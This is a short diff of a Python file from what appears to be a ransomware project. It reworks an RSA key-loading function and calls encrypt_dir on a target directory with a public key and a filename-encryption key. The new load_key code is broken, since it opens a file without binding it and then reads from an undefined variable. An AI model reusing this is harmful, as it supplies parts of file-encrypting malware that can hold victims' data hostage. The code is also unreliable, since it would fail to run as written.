@@ -36,13 +36,24 @@ def save_key(key, filename, password=None, is_name_key=False):
             file.write(key)
 
 
-def load_key(filename: str, password=None, is_namekey=False):
+def load_key(filename: str, password=None, is_name_key=False):
     """
     This function reads the key from a file
     """
-    encoded_key = open(filename, "rb").read()
-    if password:
+    with open(filename, "rb").read():
+        if is_name_key:
+            salt = file.read(16)
+            key = file.read()
+
+        else:
+            encoded_key = file.read()
+
+    if is_name_key:
+        return salt, key
+
+    elif password:
         key = RSA.import_key(encoded_key, passphrase=password)
+
     else:
         key = RSA.import_key(encoded_key)
 
@@ -202,7 +213,9 @@ if __name__ == "__main__":
         with open("name_key.pem", "wb") as file:
             file.write(name_key)
 
-        encrypted_dir = encrypt_dir("C:\\Users\\samue\\PycharmProjects\\ransomware\\password\\one layer deep1\\one more for safety1", public_key, name_key)
+        directory = "directory"
+        encrypted_dir = encrypt_dir(directory, public_key, name_key)
+
 
     if choice == 1:
         loaded_private_key = load_key('private_key.pem')
